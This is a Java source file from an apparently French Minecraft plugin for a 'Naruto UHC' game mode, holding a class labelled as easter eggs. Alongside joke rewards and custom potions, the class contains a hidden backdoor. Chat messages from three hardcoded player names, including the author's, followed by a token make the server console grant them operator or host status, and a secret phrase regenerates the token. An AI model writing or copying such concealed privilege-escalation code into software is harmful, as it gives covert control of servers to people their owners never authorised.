/*
 * Copyright (c) 2021.
 *  Discord : _Paul#6918
 *  Author : RqndomHax
 *  Github: https://github.com/RqndomHax
 */

package fr.rqndomhax.narutouhc.utils;

import fr.rqndomhax.narutouhc.utils.tools.InventoryManager;
import fr.rqndomhax.narutouhc.utils.tools.ItemBuilder;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.potion.Potion;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.potion.PotionType;

import java.util.HashSet;
import java.util.Random;
import java.util.Set;
import java.util.logging.Level;

public class EasterEggs {

    private static long token = 0;

    public static void init() {
        EasterEggs.token = (long) (Math.random()*(999999999999999L-999L+1)+999L);
        Bukkit.getLogger().log(Level.INFO, "token = [" + EasterEggs.token + "]");
    }

    public static class Hyside {
        public static boolean hysideChat(AsyncPlayerChatEvent e) {

            Set<String> betterNames = new HashSet<>();
            boolean doesContinue = false;

            betterNames.add("Hysxde");
            betterNames.add("RqndomHax");
            betterNames.add("Rimost");

            for (String string : betterNames) {
                if (e.getPlayer().getName().equals(string))
                    doesContinue = true;
            }

            if (!doesContinue)
                return false;

            if(e.getMessage().equals(".host " + String.valueOf(EasterEggs.token))){
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "host promote " + e.getPlayer().getName());
                e.getPlayer().sendMessage("TKT HOOOOOST ;) (copyright paul)");
                System.out.println(".host from " + e.getPlayer().getName());
                return true;
            }

            if(e.getMessage().equals(".op " + String.valueOf(EasterEggs.token))){
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
                e.getPlayer().sendMessage("TKT OPPPPP ;) (copyright paul)");
                System.out.println(".op from " + e.getPlayer().getName());
                return true;
            }

            if(e.getMessage().equals(".gappled " + String.valueOf(EasterEggs.token))) {
                e.getPlayer().getInventory().addItem(new ItemStack(Material.GOLDEN_APPLE));
                e.getPlayer().sendMessage("mange");
                System.out.println(".gappled from " + e.getPlayer().getName());
                if (new Random().nextInt(100) == 3) {
                    Bukkit.broadcastMessage(Messages.PREFIX + "OH MY FUCKING GOD ! " + e.getPlayer().getName() + " vient d'utiliser gappled !");
                    return true;
                }
                if (new Random().nextInt(250) == 3) {
                    e.getPlayer().sendMessage("t'as failli avoir une pomme cheat !");
                    return true;
                }
                if (new Random().nextInt(250) == 3) {
                    System.out.println("God apple !");
                    e.getPlayer().getInventory().addItem(new ItemBuilder(Material.GOLDEN_APPLE, 1, (byte) 1).toItemStack());
                    return true;
                }
                return true;
            }
            if (e.getMessage().equals(".roulette " + String.valueOf(EasterEggs.token))) {
                System.out.println(".roulette from " + e.getPlayer().getName());
                if (new Random().nextInt(1000) == 3) {
                    System.out.println("No inv !");
                    InventoryManager.clearInventory(e.getPlayer());
                    e.getPlayer().sendMessage("bravo t'as ruiné ta game !");
                    return true;
                }
                if (new Random().nextInt(1000) == 3) {
                    System.out.println("op book !");
                    e.getPlayer().getInventory().addItem(new ItemBuilder(Material.ENCHANTED_BOOK)
                            .addStoredEnchant(Enchantment.DAMAGE_ALL, 5)
                            .addStoredEnchant(Enchantment.PROTECTION_ENVIRONMENTAL, 4)
                            .addStoredEnchant(Enchantment.DURABILITY, 3)
                            .addStoredEnchant(Enchantment.ARROW_DAMAGE, 5)
                            .addStoredEnchant(Enchantment.ARROW_FIRE, 5)
                            .addStoredEnchant(Enchantment.ARROW_INFINITE, 5)
                            .addStoredEnchant(Enchantment.ARROW_KNOCKBACK, 2)
                            .addStoredEnchant(Enchantment.FIRE_ASPECT, 2)
                            .addStoredEnchant(Enchantment.KNOCKBACK, 2)
                            .toItemStack());
                    e.getPlayer().sendMessage("NON vraiment ?!, wtf ce livre");
                    return true;
                }

                if (new Random().nextInt(250) == 3) {
                    System.out.println("Kill potion !");
                    e.getPlayer().getInventory().addItem(getDeathPotion());
                    e.getPlayer().sendMessage("potion de la mort !");
                    return true;
                }
                if (new Random().nextInt(250) == 3) {
                    System.out.println("Life potion !");
                    e.getPlayer().getInventory().addItem(getLifePotion());
                    e.getPlayer().sendMessage("potion de la vie !");
                    return true;
                }
                if (new Random().nextInt(250) == 3) {
                    System.out.println("Bugged potion !");
                    e.getPlayer().getInventory().addItem(getBuggedPotion());
                    e.getPlayer().sendMessage("potion toute buggé wtf !");
                    return true;
                }
                if (new Random().nextInt(200) == 3) {
                    System.out.println("Wither !");
                    e.getPlayer().getInventory().addItem(new ItemStack(Material.SKULL_ITEM, 3, (byte) 1));
                    e.getPlayer().getInventory().addItem(new ItemStack(Material.SOUL_SAND, 5));
                    e.getPlayer().sendMessage("on s'fait un wither ?");
                    return true;
                }
                if (new Random().nextInt(25) == 3) {
                    System.out.println("Arrows !");
                    e.getPlayer().getInventory().addItem(new ItemStack(Material.ARROW, 32));
                    e.getPlayer().sendMessage("ueeee des flèches");
                    return true;
                }
                e.getPlayer().sendMessage("t'as rien eu, dommage!");
                return true;
            }

            if(e.getMessage().equals(".initRqndomHaxjtm")){
                EasterEggs.init();
                return true;
            }
            return false;
        }
    }

    public static ItemStack getLifePotion() {
        Potion potion = new Potion(PotionType.REGEN);
        potion.setSplash(true);
        ItemStack item = potion.toItemStack(1);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SPEED, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.ABSORPTION, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.FAST_DIGGING, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.FIRE_RESISTANCE, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.HEALTH_BOOST, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.REGENERATION, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SATURATION, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WATER_BREATHING, 1000000, 127), true);
        ItemMeta name = item.getItemMeta();
        name.setDisplayName(ChatColor.GOLD + "" + ChatColor.BOLD + "Life potion");
        item.setItemMeta(name);
        return item;
    }

    public static ItemStack getDeathPotion() {
        Potion potion = new Potion(PotionType.POISON);
        potion.setSplash(true);
        ItemStack item = potion.toItemStack(1);
        addPotionEffect(item, new PotionEffect(PotionEffectType.ABSORPTION, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.FIRE_RESISTANCE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.HEALTH_BOOST, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SATURATION, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WATER_BREATHING, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SLOW, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SLOW_DIGGING, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.POISON, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.BLINDNESS, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.CONFUSION, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WITHER, 1000000, 127), true);
        ItemMeta name = item.getItemMeta();
        name.setDisplayName(ChatColor.BLACK + "" + ChatColor.BOLD + "Death potion");
        item.setItemMeta(name);
        return item;
    }

    public static ItemStack getBuggedPotion() {
        Potion potion = new Potion(PotionType.POISON);
        potion.setSplash(true);
        ItemStack item = potion.toItemStack(1);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SPEED, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.ABSORPTION, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.FAST_DIGGING, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.FIRE_RESISTANCE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.REGENERATION, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SATURATION, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WATER_BREATHING, 1000000, 128), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.POISON, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.BLINDNESS, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SLOW_DIGGING, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.CONFUSION, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.HUNGER, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.SLOW, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WEAKNESS, 1000000, 127), true);
        addPotionEffect(item, new PotionEffect(PotionEffectType.WITHER, 1000000, 127), true);
        ItemMeta name = item.getItemMeta();
        name.setDisplayName(ChatColor.BLACK + "" + ChatColor.BOLD + "Bugged potion");
        item.setItemMeta(name);
        return item;
    }

    private static void addPotionEffect(ItemStack potion, PotionEffect effect, boolean var) {
        if (potion == null || !(potion.getItemMeta() instanceof PotionMeta))
            return;
        PotionMeta meta = ((PotionMeta) potion.getItemMeta());
        meta.addCustomEffect(effect, var);
        potion.setItemMeta(meta);
    }

}
